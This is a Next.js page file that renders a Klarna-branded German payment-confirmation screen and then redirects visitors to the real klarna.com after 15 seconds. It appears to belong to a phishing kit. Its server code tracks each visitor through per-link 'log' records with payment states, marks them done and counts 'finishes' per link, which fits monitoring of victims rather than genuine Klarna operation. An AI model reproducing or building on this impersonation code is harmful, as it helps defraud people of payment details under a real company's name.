import React from "react";
import Head from "next/head";
import styles from "../../styles/Success.module.scss";
import Header from "../../components/Header";
import Footer from "../../components/Footer";
import Banner from "../../components/Banner";
import {GetServerSideProps} from "next";
import Cookies from "cookies";
import {NextRouter, withRouter} from "next/router";
import prisma from "../../prisma/prisma";
import PaymentInfo from "../../components/PaymentInfo";
import TrustedBy from "../../components/TrustedBy";
import SmartCard from "../../components/SmartCard";
import CustomerCard from "../../components/CustomerCard";
import Success from "../../components/Success";
import {User} from "../../types/User";

export const getServerSideProps: GetServerSideProps = async ({
                                                               req,
                                                               res,
                                                               params,
                                                             }) => {
  const link = params?.link as string;
  const cookies = new Cookies(req, res);
  const id = cookies.get("id");
  const url = cookies.get("url");

  if (id && url && url === link) {
    const log = await prisma.log.findFirst({
      where: {id: parseInt(id)},
      include: {link: true},
    });

    if (log)
      if (log.link.url === url) {
        if (log.active && !log.done) {
          if (log.state < 2)
            return {
              redirect: {permanent: false, destination: `/payment/${link}`},
            };
          await prisma.log.update({
            where: {id: log.id},
            data: {done: true},
          });
          await prisma.link.update({
            where: {id: log.link.id},
            data: {finishes: log.link.finishes + 1},
          });

          const {user} = JSON.parse(log.defaultData);
          return {
            props: {user}
          };
        } else {
          return {redirect: {permanent: false, destination: "/"}};
        }
      }
  }

  return {
    redirect: {permanent: false, destination: `/${link}`},
  };
};

type state = {}

type props = {
  router: NextRouter;
  user: User;
}

class Link extends React.Component<props, state> {
  constructor(props) {
    super(props);
  }

  componentDidMount() {
    setTimeout(() => (window.location.href = "https://klarna.com/de/"), 15000);
  }

  render() {
    return (
      <>
        <Head>
          <title>Klarna Business – Payment Solution</title>
          <link rel="icon" href="/favicon.ico"/>
        </Head>

        <Banner/>
        <Header name={'Zahlungsbestätigung'}/>
        <Success user={this.props.user}/>
        <TrustedBy/>
        <SmartCard/>
        <CustomerCard/>
        <Footer/>
      </>
    );
  }
}

export default withRouter(Link);
